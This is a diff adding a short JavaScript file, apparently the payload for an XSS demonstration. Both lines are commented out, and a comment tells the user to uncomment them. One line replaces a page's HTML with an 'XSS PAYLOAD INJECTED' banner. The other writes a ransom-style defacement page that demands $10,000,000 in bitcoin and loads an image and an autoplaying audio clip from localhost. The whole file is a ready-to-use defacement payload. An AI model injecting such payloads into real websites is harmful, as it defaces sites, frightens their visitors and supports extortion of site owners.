@@ -1,0 +1,3 @@
+//UNCOMMENT LINES. FIRST LINE FOR BASIC DEFAME. SECOND FOR REAL LIFE EXAMPLE.
+//document.getElementsByTagName("html")[0].innerHTML = "<h1>XSS PAYLOAD INJECTED!!</h1>";
+//document.getElementsByTagName("html")[0].innerHTML ='<body style="background-color:black;color:white;text-align:center;margin:0;padding:0;"><h1>TO RECLAIM THIS SITE PAY $10,000,000 TO BTC:XYZXYZXYZ</h1><img src="http://localhost:8000/hacker.webp" alt="REDLIGHT" style="max-width:100%;height:auto;display:block;margin:auto;"><audio controls autoplay loop><source src="http://localhost:8000/evil_laugh.mp3" type="audio/mpeg"></audio></body>';
